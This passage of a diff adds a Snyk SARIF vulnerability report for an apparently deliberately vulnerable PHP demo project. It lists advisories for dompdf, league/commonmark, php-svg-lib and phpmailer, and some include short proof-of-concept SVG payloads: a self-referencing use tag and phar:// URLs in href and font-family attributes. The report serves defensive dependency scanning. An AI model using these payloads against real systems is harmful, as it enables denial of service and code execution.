malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n## Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n## How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n# Remediation\nUpgrade `league/commonmark` to version 0.18.3 or higher.\n# References\n- [GitHub Commit](https://github.com/commonmark/commonmark.js/commit/c89b35c5fc99bdf1d2181f7f0c9fcb8a1abc27c8)\n- [GitHub Issue](https://github.com/thephpleague/commonmark/issues/353)\n- [GitHub Release](https://github.com/thephpleague/commonmark/releases/tag/0.18.3)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-79",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 6.5,
+                "security-severity": "6.5"
+              }
+            },
+            {
+              "id": "SNYK-PHP-LEAGUECOMMONMARK-8493867",
+              "shortDescription": {
+                "text": "High severity - Inefficient Algorithmic Complexity vulnerability in league/commonmark"
+              },
+              "fullDescription": {
+                "text": "league/commonmark@0.18.2"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: league/commonmark\n* Introduced through: snyk/phpgoof@0.0.0 and league/commonmark@0.18.2\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › league/commonmark@0.18.2\n# Overview\n[league/commonmark](https://packagist.org/packages/league/commonmark) is a PHP-based Markdown parser which supports the full CommonMark spec. It is based on the CommonMark JS reference implementation.\n\nAffected versions of this package are vulnerable to Inefficient Algorithmic Complexity through the parsing of specially crafted Markdown inputs. An attacker can exhaust system resources and cause a denial of service.\r\n\r\n# Workaround \r\nThis vulnerability can be mitigated by setting very low `memory_limit` and `max_execution_time` PHP configurations to prevent runaway resource usage, implementing rate-limiting, bot protection, or other approaches to reduce the risk of simultaneous bad requests hitting your site, limiting the size of inputs fed into this library, and limiting the use of this library to trusted users.\n# Remediation\nUpgrade `league/commonmark` to version 2.6.0 or higher.\n# References\n- [GitHub Commit](https://github.com/thephpleague/commonmark/commit/9efa9145e3c1b1e2139896abfc278211eacfb40c)\n- [GitHub Issue](https://github.com/commonmark/commonmark.js/issues/129)\n- [GitHub Issue](https://github.com/commonmark/commonmark.js/issues/157)\n- [GitHub Issue](https://github.com/commonmark/commonmark.js/issues/172)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-407",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 8.7,
+                "security-severity": "8.7"
+              }
+            },
+            {
+              "id": "SNYK-PHP-PHENXPHPSVGLIB-6125588",
+              "shortDescription": {
+                "text": "Medium severity - Uncontrolled Recursion vulnerability in phenx/php-svg-lib"
+              },
+              "fullDescription": {
+                "text": "(CVE-2023-50251) phenx/php-svg-lib@0.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: phenx/php-svg-lib\n* Introduced through: snyk/phpgoof@0.0.0, dompdf/dompdf@1.2.0 and others\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0 › phenx/php-svg-lib@0.4.1\n# Overview\n[phenx/php-svg-lib](https://packagist.org/packages/phenx/php-svg-lib) is a library to read, parse and export to PDF SVG files.\n\nAffected versions of this package are vulnerable to Uncontrolled Recursion via the parsing of attributes in an SVG `use` tag, which can lead to infinite recursion. An attacker can cause a denial of service by crafting an SVG document that triggers this recursive behavior. This is only exploitable if the `id` attribute in the `use` tag is the same as the `href` or `xlink:href` link attribute, causing the parser to enter an infinite loop until memory resources are exhausted.\n# PoC\n```php\n\n<svg width=\"200\" height=\"200\"\n  xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <use id=\"selfref\" xlink:href=\"#selfref\" />\n</svg>\n\n```\n# Remediation\nUpgrade `phenx/php-svg-lib` to version 0.5.1 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/php-svg-lib/commit/88163cbe562d9b391b3a352e54d9c89d02d77ee0)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-674",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 5.3,
+                "security-severity": "5.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-PHENXPHPSVGLIB-6125684",
+              "shortDescription": {
+                "text": "High severity - External Control of System or Configuration Setting vulnerability in phenx/php-svg-lib"
+              },
+              "fullDescription": {
+                "text": "(CVE-2023-50252) phenx/php-svg-lib@0.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: phenx/php-svg-lib\n* Introduced through: snyk/phpgoof@0.0.0, dompdf/dompdf@1.2.0 and others\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0 › phenx/php-svg-lib@0.4.1\n# Overview\n[phenx/php-svg-lib](https://packagist.org/packages/phenx/php-svg-lib) is a library to read, parse and export to PDF SVG files.\n\nAffected versions of this package are vulnerable to External Control of System or Configuration Setting due to improper sanitization of the `href` attribute from the `<use>` tag when it is merged with an `<image>` tag. An attacker can cause an unsafe file read that may lead to PHAR Deserialization vulnerability in PHP versions prior to 8 by manipulating the `href` attribute.\n\n# Workaround\n\nSystems utilizing php-svg-lib can implement input validation using logic similar to the following:\n\n```php\n$parser = xml_parser_create(\"utf-8\");\nxml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, false);\nxml_set_element_handler(\n    $parser,\n    function ($parser, $name, $attributes) {\n        if (strtolower($name) === \"image\" || strtolower($name) === \"use\") {\n            $attributes = array_change_key_case($attributes, CASE_LOWER);\n            $urls = [];\n            $urls[] = $attributes[\"xlink:href\"] ?? \"\";\n            $urls[] = $attributes[\"href\"] ?? \"\";\n            foreach ($urls as $url) {\n                if (!empty($url)) {\n                    // perform validation here\n                }\n            }\n        }\n\n        // include other tag/attribute validation\n    },\n    false\n);\n\nif (($fp = fopen($url, \"r\")) !== false) {\n    while ($line = fread($fp, 8192)) {\n        xml_parse($parser, $line, false);\n    }\n    fclose($fp);\n    xml_parse($parser, \"\", true);\n}\nxml_parser_free($parser);\n```\n# PoC\n```php\n\n<svg width=\"200\" height=\"200\"\n  xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <image id=\"phar:///poc.phar\" xlink:href=\"file:///existing/safe/image.png\" />\n  <use href=\"phar:///poc.phar\" width=\"500\" height=\"500\"/>\n</svg>\n\n```\n# Remediation\nUpgrade `phenx/php-svg-lib` to version 0.5.1 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/php-svg-lib/commit/08ce6a96d63ad7216315fae34a61c886dd2dc030)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-15",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 8.3,
+                "security-severity": "8.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-PHENXPHPSVGLIB-6262046",
+              "shortDescription": {
+                "text": "Medium severity - External Control of File Name or Path vulnerability in phenx/php-svg-lib"
+              },
+              "fullDescription": {
+                "text": "(CVE-2024-25117) phenx/php-svg-lib@0.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: phenx/php-svg-lib\n* Introduced through: snyk/phpgoof@0.0.0, dompdf/dompdf@1.2.0 and others\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0 › phenx/php-svg-lib@0.4.1\n# Overview\n[phenx/php-svg-lib](https://packagist.org/packages/phenx/php-svg-lib) is a library to read, parse and export to PDF SVG files.\n\nAffected versions of this package are vulnerable to External Control of File Name or Path due to insufficient validation of the `font-family` attribute in SVG inline styles. Specifically, the library does not adequately verify that the `font-family` does not contain a PHAR URL. Additionally, the library fails to check if external references are permitted, which could lead to the bypass of restrictions or remote code execution in projects utilizing this library, should they not rigorously revalidate the `fontName` passed by the library.\n# PoC\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\r\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\r\n    <text x=\"20\" y=\"35\" style=\"color:red;font-family:phar:///path/to/whatever.phar/blaklis;\">My</text>\r\n</svg>\r\n```\n# Remediation\nUpgrade `phenx/php-svg-lib` to version 0.5.2 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/php-svg-lib/commit/732faa9fb4309221e2bd9b2fda5de44f947133aa)\n- [GitHub Commit](https://github.com/dompdf/php-svg-lib/commit/8ffcc41bbde39f09f94b9760768086f12bbdce42)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-73",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 6.8,
+                "security-severity": "6.8"
+              }
+            },
+            {
+              "id": "snyk:lic:composer:phenx:php-svg-lib:LGPL-3.0",
+              "shortDescription": {
+                "text": "High severity - LGPL-3.0 license vulnerability in phenx/php-svg-lib"
+              },
+              "fullDescription": {
+                "text": "phenx/php-svg-lib@0.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Module: phenx/php-svg-lib\n* Introduced through: snyk/phpgoof@0.0.0, dompdf/dompdf@1.2.0 and others\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0 › phenx/php-svg-lib@0.4.1\nLGPL-3.0 license"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "composer"
+                ],
+                "security-severity": "undefined"
+              }
+            },
+            {
+              "id": "SNYK-PHP-PHPMAILERPHPMAILER-1311001",
+              "shortDescription": {
+                "text": "Critical severity - Arbitrary Code Execution vulnerability in phpmailer/phpmailer"
+              },
+              "fullDescription": {
+                "text": "(CVE-2021-3603) phpmailer/phpmailer@6.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: phpmailer/phpmailer\n* Introduced through: snyk/phpgoof@0.0.0 and phpmailer/phpmailer@6.4.1\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › phpmailer/phpmailer@6.4.1\n# Overview\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. If the `$patternselect` parameter to `validateAddress()` is set to 'php' (the default, defined by `PHPMailer::$validator`), and the global namespace contains a function called `php`, it will be called in preference to the built-in validator of the same name. Mitigated in PHPMailer 6.5.0 by denying the use of simple strings as validator function names.\n# Remediation\nUpgrade `phpmailer/phpmailer` to version 6.5.0 or higher.\n# References\n- [GitHub Release](https://github.com/PHPMailer/PHPMailer/releases/tag/v6.5.0)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-94",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 9.8,
+                "security-severity": "9.8"
+              }
+            },
+            {
+              "id": "SNYK-PHP-PHPMAILERPHPMAILER-1311002",
+              "shortDescription": {
+                "text": "Critical severity - Arbitrary Code Execution vulnerability in phpmailer/phpmailer"
+              },
+              "fullDescription": {
+                "text": "(CVE-2021-34551) phpmailer/phpmailer@6.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: phpmailer/phpmailer\n* Introduced through: snyk/phpgoof@0.0.0 and phpmailer/phpmailer@6.4.1\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › phpmailer/phpmailer@6.4.1\n# Overview\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. If the `$lang_path` parameter is passed unfiltered from user input, it can be set to a UNC path, and if an attacker is also able to persuade the server to load a file from that UNC path, a script file under their control may be executed. This vulnerability only applies to systems that resolve UNC paths, typically only Microsoft Windows. PHPMailer 6.5.0 mitigates this by no longer treating translation files as PHP code, but by parsing their text content directly. This approach avoids the possibility of executing unknown code while retaining backward compatibility.\n# Remediation\nUpgrade `phpmailer/phpmailer` to version 6.5.0 or higher.\n# References\n- [GitHub Release](https://github.com/PHPMailer/PHPMailer/releases/tag/v6.5.0)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-94",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 9.8,
+                "security-severity": "9.8"
+              }
+            },
+            {
+              "id": "snyk:lic:composer:phpmailer:phpmailer:LGPL-2.1",
+              "shortDescription": {
+                "text": "High severity - LGPL-2.1 license vulnerability in phpmailer/phpmailer"
+              },
+              "fullDescription": {
+                "text": "phpmailer/phpmailer@6.4.1"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Module: phpmailer/phpmailer\n* Introduced through: snyk/phpgoof@0.0.0 and phpmailer/phpmailer@6.4.1\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › phpmailer/phpmailer@6.4.1\nLGPL-2.1 license"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "composer"
+                ],
+                "security-severity": "undefined"
+              }
+            },
+            {
+              "id": "snyk:lic:composer:phenx:php-font-lib:LGPL-3.0",
+              "shortDescription": {
+                "text": "High severity - LGPL-3.0 license vulnerability in phenx/php-font-lib"
+              },
+              "fullDescription": {
+                "text": "phenx/php-font-lib@0.5.4"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Module: phenx/php-font-lib\n* Introduced through: snyk/phpgoof@0.0.0, dompdf/dompdf@1.2.0 and others\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0 › phenx/php-font-lib@0.5.4\nLGPL-3.0 license"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "composer"
+                ],
+                "security-severity": "undefined"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-2428942",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-2936790",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-2953235",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-3033151",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-3261241",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-3315269",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-6124861",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-8382096",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a critical severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-DOMPDFDOMPDF-8382097",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable dompdf/dompdf package with a critical severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "dompdf/dompdf@1.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-LEAGUECOMMONMARK-173996",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable league/commonmark package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "league/commonmark@0.18.2"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-LEAGUECOMMONMARK-174004",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable league/commonmark package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "league/commonmark@0.18.2"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-LEAGUECOMMONMARK-8493867",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable league/commonmark package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "league/commonmark@0.18.2"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-PHENXPHPSVGLIB-6125588",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable phenx/php-svg-lib package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phenx/php-svg-lib@0.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-PHENXPHPSVGLIB-6125684",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable phenx/php-svg-lib package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phenx/php-svg-lib@0.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-PHENXPHPSVGLIB-6262046",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable phenx/php-svg-lib package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phenx/php-svg-lib@0.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "snyk:lic:composer:phenx:php-svg-lib:LGPL-3.0",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable phenx/php-svg-lib package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phenx/php-svg-lib@0.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-PHPMAILERPHPMAILER-1311001",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable phpmailer/phpmailer package with a critical severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phpmailer/phpmailer@6.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-PHP-PHPMAILERPHPMAILER-1311002",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable phpmailer/phpmailer package with a critical severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phpmailer/phpmailer@6.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "snyk:lic:composer:phpmailer:phpmailer:LGPL-2.1",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable phpmailer/phpmailer package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phpmailer/phpmailer@6.4.1"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "snyk:lic:composer:phenx:php-font-lib:LGPL-3.0",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable phenx/php-font-lib package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "composer.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "phenx/php-font-lib@0.5.4"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
